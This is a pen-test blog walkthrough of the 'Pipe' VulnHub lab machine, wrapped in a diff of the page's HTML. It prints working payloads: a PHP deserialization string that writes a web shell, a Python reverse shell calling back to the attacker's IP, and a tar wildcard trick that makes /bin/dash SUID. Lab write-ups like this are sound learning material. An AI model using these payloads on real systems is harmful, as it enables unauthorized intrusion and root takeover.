@@ -1,0 +1,391 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<script data-cfasync="false" type="text/javascript" src="//use.typekit.net/axj3cfp.js"></script>
+	<script data-cfasync="false" type="text/javascript">try{Typekit.load();}catch(e){}</script>
+	<meta charset="utf-8">
+	<title>pipe  | Bob1Bob2</title>
+
+<meta name="author" content="Bob1Bob2"> 
+
+<meta name="description" content="Tools: netdiscover
+Nmap
+Wfuzz
+Nikto
+Burp Vulnerabilities: Tar arbitrary command execution Use netdiscover to detect target IP address netdiscover -i &hellip;"> <meta name="keywords" content="">
+
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+	<link href="/atom.xml" rel="alternate" title="Bob1Bob2" type="application/atom+xml">
+	<link rel="canonical" href="">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<link href="/stylesheets/font-awesome.min.css" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	<script type="text/javascript" src="/javascripts/jquery.fancybox.pack.js"></script>
+
+<script language="Javascript" type="text/javascript">
+$(document).ready(
+  function() {
+    (function($) {
+      $(".fancybox[data-content-id]").each(function() {
+        this.href = $(this).data('content-id');
+      });
+      $(".fancybox").fancybox({
+        beforeLoad: function() {
+          var el, 
+              id = $(this.element).data('title-id');
+
+          if (id) {
+            el = $('#' + id);
+
+            if (el.length) {
+              this.title = el.html();
+            }
+          }
+          if ($(this).data('content')) {
+            this.content = $(this).data('content');
+          }
+        },
+        helpers: {
+          title: {
+            type: 'inside'
+          }
+        }
+      });
+    })(jQuery);
+  }
+);
+</script>
+
+	
+</head>
+
+
+
+<body>
+	<header id="header" class="inner"><h1><a href="/">Bob1Bob2</a></h1>
+<h4>Pen Test Notes</h4>
+<nav id="main-nav"><ul>
+	<li><a href="/">Blog</a></li>
+	<li><a href="/about">About</a></li>
+	<li><a href="/portfolio">Portfolio</a></li>
+	<li><a href="/archives">Archive</a></li>
+</ul>
+</nav>
+<nav id="mobile-nav">
+	<div class="alignleft menu">
+		<a class="button">Menu</a>
+		<div class="container"><ul>
+	<li><a href="/">Blog</a></li>
+	<li><a href="/about">About</a></li>
+	<li><a href="/portfolio">Portfolio</a></li>
+	<li><a href="/archives">Archive</a></li>
+</ul>
+</div>
+	</div>
+	<div class="alignright search">
+		<a class="button"></a>
+		<div class="container">
+			<form action="https://www.google.com/search" method="get">
+				<input type="text" name="q" results="0">
+				<input type="hidden" name="q" value="site:wg135.github.io">
+			</form>
+		</div>
+	</div>
+</nav>
+
+
+</header>
+
+	<div id="content" class="inner"><article class="post">
+	<h2 class="title">Pipe</h2>
+	<div class="entry-content"><h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>Nikto</li>
+<li>Burp</li>
+</ul>
+
+
+<h3>Vulnerabilities:</h3>
+
+<p><a href="http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">Tar arbitrary command execution</a></p>
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
+<img src="/images/blog/vulhub/pipe/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.41.163 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.41.163 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>there are 4 ports are opening</p>
+
+<p>use nikto to scan</p>
+
+<p><code>nikto -h 192.168.41.162</code></p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>shows there is an <code>index.php</code> but needs autherication</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use wfuzz to scan</p>
+
+<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  --hc 401 http://192.168.41.163/FUZZ 2&gt;/dev/null</code></p>
+
+<p>get a path <code>scriptz</code></p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find a file <code>log.php.BAK</code>, looks like backup file of log.php</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'><span class="k">class</span> <span class="nc">Log</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="k">public</span> <span class="nv">$filename</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">public</span> <span class="k">function</span> <span class="nf">__construct</span><span class="p">()</span>
+</span><span class='line'>    <span class="p">{</span>
+</span><span class='line'>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span><span class='line'>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">public</span> <span class="k">function</span> <span class="nf">PrintLog</span><span class="p">()</span>
+</span><span class='line'>    <span class="p">{</span>
+</span><span class='line'>        <span class="nv">$pre</span> <span class="o">=</span> <span class="s2">&quot;[LOG]&quot;</span><span class="p">;</span>
+</span><span class='line'>        <span class="nv">$now</span> <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="nv">$str</span> <span class="o">=</span> <span class="s1">&#39;$pre - $now - $this-&gt;data&#39;</span><span class="p">;</span>
+</span><span class='line'>        <span class="k">eval</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\$</span><span class="s2">str = </span><span class="se">\&quot;</span><span class="si">$str\</span><span class="s2">&quot;</span><span class="p">;</span><span class="s2">&quot;);</span>
+</span><span class='line'><span class="s2">        echo </span><span class="si">$str</span><span class="s2">;</span>
+</span><span class='line'><span class="s2">    }</span>
+</span><span class='line'>
+</span><span class='line'><span class="s2">    public function __destruct()</span>
+</span><span class='line'><span class="s2">    {</span>
+</span><span class='line'><span class="s2">        file_put_contents(</span><span class="si">$this-&gt;filename</span><span class="s2">, </span><span class="si">$this-&gt;data</span><span class="s2">, FILE_APPEND);</span>
+</span><span class='line'><span class="s2">    }</span>
+</span><span class='line'><span class="s2">}</span>
+</span><span class='line'><span class="s2">?&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>in order to check if the authentication can be bypassed, I use <code>http method tamper</code>.</p>
+
+<p><code>nmap -p 80 --script http-method-tamper --script-args 'http-method-tamper.paths={/index.php}' 192.168.41.163</code></p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>It&rsquo;s vulnerable to POST method.</p>
+
+<p>Use Burp to change GET request to /index.php to POST request, and get the page:</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>check the source code:</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>The page will load <code>scriptz/php.js</code>, and it serialises some data. Based on the log.php.BAK code,</p>
+
+<p>click link <code>Show Artist Info</code>, get the url, after decoding:</p>
+
+<p><code>O:4:"Info":4:{s:2:"id";i:1;s:9:"firstname";s:4:"Rene";s:7:"surname";s:8:"Margitte";s:7:"artwork";s:23:"The+Treachery+of+Images";}</code></p>
+
+<p>The “Info” function looks like a way to read information from a specific file. Recheck the log.php.BAK file, find it use <code>file_put_contents($this-&gt;filename, $this-&gt;data, FILE_APPEND)</code> to write data to a file.</p>
+
+<p>Test if it can write to a Log file</p>
+
+<p><code>param=O:3:"Log":2:{s:8:"filename";s:8:"Test.txt";s:4:"data";s:4:"TEST";}</code></p>
+
+<p>doesn&rsquo;t work</p>
+
+<p><code>param=O:3:"Log":2:{s:8:"filename";s:30:"/var/www/html/scriptz/Test.txt";s:4:"data";s:4:"TEST";}</code></p>
+
+<p>works</p>
+
+<p>based on that, build payload:</p>
+
+<p><code>param=O:3:"Log":2:{s:8:"filename";s:31:"/var/www/html/scriptz/shell.php";s:4:"data";s:60:" &lt;?php echo '&lt;pre&gt;'; system($_GET['cmd']); echo '&lt;/pre&gt;'; ?&gt;";}</code></p>
+
+<p>replace the parameter in Burp. forward the traffic</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>then:</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>webshell is there.</p>
+
+<p>setup backdoor:</p>
+
+<p><code>http://192.168.41.163/scriptz/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.41.149",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></p>
+
+<p>get the shell:</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+
+<p>try to find linux kernel local exploit, but I find there is no gcc in the box.</p>
+
+<p>keep looking.</p>
+
+<p>find</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Looks like system does backup automatically. check <code>/etc/crontab</code></p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>/usr/bin/compress.sh</code> can be read</p>
+
+<p>I find the tar uses wild card. Here I will try Tar arbitrary command execution.</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>first check which shell is being use in target</p>
+
+<p><code>ls -al /bin/*sh</code></p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>start to create shell:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">pipe</span><span class="o">:/</span><span class="nx">home</span><span class="o">/</span><span class="nx">rene</span><span class="o">/</span><span class="nx">backup</span><span class="err">$</span> <span class="k">echo</span> <span class="o">&gt;</span> <span class="o">--</span><span class="nx">checkpoint</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
+</span><span class='line'><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">pipe</span><span class="o">:/</span><span class="nx">home</span><span class="o">/</span><span class="nx">rene</span><span class="o">/</span><span class="nx">backup</span><span class="err">$</span> <span class="k">echo</span> <span class="o">&gt;</span> <span class="o">--</span><span class="nx">checkpoint</span><span class="o">-</span><span class="nx">action</span><span class="o">=</span><span class="nb">exec</span><span class="o">=</span><span class="nx">sh\</span> <span class="nx">shell</span><span class="o">.</span><span class="nx">sh</span><span class="p">;</span>
+</span><span class='line'><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">pipe</span><span class="o">:/</span><span class="nx">home</span><span class="o">/</span><span class="nx">rene</span><span class="o">/</span><span class="nx">backup</span><span class="err">$</span> <span class="k">echo</span> <span class="s1">&#39;chmod u+s /bin/dash&#39;</span> <span class="o">&gt;</span> <span class="nx">shell</span><span class="o">.</span><span class="nx">sh</span>
+</span><span class='line'><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">pipe</span><span class="o">:/</span><span class="nx">home</span><span class="o">/</span><span class="nx">rene</span><span class="o">/</span><span class="nx">backup</span><span class="err">$</span> <span class="k">echo</span> <span class="s1">&#39;touch /home/rene/backup/done&#39;</span> <span class="o">&gt;&gt;</span> <span class="nx">shell</span><span class="o">.</span><span class="nx">sh</span>
+</span><span class='line'><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">pipe</span><span class="o">:/</span><span class="nx">home</span><span class="o">/</span><span class="nx">rene</span><span class="o">/</span><span class="nx">backup</span><span class="err">$</span> <span class="nx">cat</span> <span class="nx">shell</span><span class="o">.</span><span class="nx">sh</span>
+</span><span class='line'><span class="nb">chmod</span> <span class="nx">u</span><span class="o">+</span><span class="nx">s</span> <span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">dash</span>
+</span><span class='line'><span class="nb">touch</span> <span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">rene</span><span class="o">/</span><span class="nx">backup</span><span class="o">/</span><span class="nx">done</span>
+</span><span class='line'><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">pipe</span><span class="o">:/</span><span class="nx">home</span><span class="o">/</span><span class="nx">rene</span><span class="o">/</span><span class="nx">backup</span><span class="err">$</span> <span class="nb">chmod</span> <span class="o">+</span><span class="nx">x</span> <span class="nx">shell</span><span class="o">.</span><span class="nx">sh</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>just wait a few miniutes and a file <code>done</code> will be created</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>run <code>/bin/dash</code> and get the shell</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2016-08-23T01:31:51-05:00" pubdate data-updated="true">2016-08-23 01:31:51 -0500</time></div>
+	
+
+<div class="tags">
+
+	<a class='category' href='/blog/categories/php-serialization/'>php serialization</a>, <a class='category' href='/blog/categories/tar-wildcard/'>tar wildcard</a>, <a class='category' href='/blog/categories/vulhub/'>vulhub</a>
+
+</div>
+
+
+	
+</div></article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	<a class="addthis_button_tweet"></a>
+	
+	
+<!---	<a class="addthis_counter addthis_pill_style"></a> --->
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+
+</div>
+	<footer id="footer" class="inner">Copyright &copy; 2017
+
+    Bob1Bob2
+
+<br>
+Powered by Octopress.
+</footer>
+	<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+
+
+
+
+</body>
+</html>
